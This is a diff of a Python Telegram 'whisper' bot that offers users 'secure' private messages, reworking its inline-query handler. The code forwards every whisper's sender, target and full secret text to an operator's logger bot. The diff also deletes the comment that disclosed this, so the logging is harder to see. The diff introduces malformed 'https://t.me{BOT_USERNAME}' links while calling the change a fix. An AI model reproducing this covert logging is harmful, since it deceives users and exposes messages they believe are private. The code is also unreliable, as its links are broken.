@@ -20,7 +20,7 @@ bot1 = Bot(token=WHISPER_BOT_TOKEN)
 bot2 = Bot(token=LOGGER_BOT_TOKEN)
 dp = Dispatcher()
 
-# 🗄️ DATABASE SETUP (Async)
+# 🗄️ DATABASE SETUP
 async def init_db():
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute('''
@@ -48,19 +48,33 @@ async def log_to_admin(sender_user, target, text):
     except Exception as e:
         print(f"Logging failed: {e}")
 
-# 🚀 BOT 1: INLINE QUERY HANDLER (In Groups)
+# 🚀 BOT 1: INLINE QUERY HANDLER (Fixed: Instant calculation logic)
 @dp.inline_query()
 async def inline_handler(inline_query: types.InlineQuery):
     text = inline_query.query.strip()
     
-    # Trigger menu item the split second they type the '@' symbol
-    if not text.startswith("@"):
-        return 
-        
+    # Renders placeholder help card immediately when inline mode wakes up
+    if not text:
+        fallback_url = f"https://t.me{BOT_USERNAME}"
+        input_content = types.InputTextMessageContent(
+            message_text="❌ Please type a username and message to send a secure whisper!"
+        )
+        keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
+            [types.InlineKeyboardButton(text="💬 How to use Whisper", url=fallback_url)]
+        ])
+        item = types.InlineQueryResultArticle(
+            id="hint_card",
+            title="🤫 Type a whisper...",
+            description="Format: @username secret message",
+            input_message_content=input_content,
+            reply_markup=keyboard
+        )
+        await inline_query.answer([item], cache_time=0, is_personal=True)
+        return
+
+    # Dynamically separate username and text blocks safely
     parts = text.split(" ", 1)
     target_username = parts[0]
-    
-    # Safe splitting fallback ensures name card shows up even before the text is typed
     whisper_text = parts[1].strip() if len(parts) > 1 else ""
     
     if target_username == "@":
@@ -68,10 +82,9 @@ async def inline_handler(inline_query: types.InlineQuery):
 
     sender = inline_query.from_user
     whisper_id = secrets.token_urlsafe(8)
-    expires_at = int(time.time()) + 86400  # 24 hours from now
+    expires_at = int(time.time()) + 86400  # 24 hours
     
-    # Build clean link with absolute pathing to prevent browser error screens
-    redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
+    redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
     
     if whisper_text:
         async with aiosqlite.connect(DB_PATH) as db:
@@ -81,7 +94,6 @@ async def inline_handler(inline_query: types.InlineQuery):
             )
             await db.commit()
         
-        # Dispatches the actual secret text string directly to your admin log panel
         await log_to_admin(sender.username or sender.id, target_username, whisper_text)
         
         input_content = types.InputTextMessageContent(
@@ -92,15 +104,14 @@ async def inline_handler(inline_query: types.InlineQuery):
         ])
         description_text = f"Message: {whisper_text[:30]}..."
     else:
-        # Fallback card shown while user is typing out the message
-        fallback_url = f"https://t.me/{BOT_USERNAME}"
+        # Prevents disappearing loops by keeping an active preview state visible while typing
         input_content = types.InputTextMessageContent(
-            message_text="❌ Please type a message after the username before clicking the send card!"
+            message_text="❌ No text payload was written! Please type a message next time."
         )
         keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
-            [types.InlineKeyboardButton(text="💬 How to use Whisper", url=fallback_url)]
+            [types.InlineKeyboardButton(text="🔑 Open Bot Chat Box", url=redirect_url)]
         ])
-        description_text = "Type your secret message after the username..."
+        description_text = "Continue typing your private message text..."
 
     item = types.InlineQueryResultArticle(
         id=whisper_id,
@@ -110,7 +121,6 @@ async def inline_handler(inline_query: types.InlineQuery):
         reply_markup=keyboard
     )
     
-    # cache_time=0 forces live lookup updates character by character
     await inline_query.answer([item], cache_time=0, is_personal=True)
 
 # 📥 BOT 1: START HANDLER (welcome + deep links)
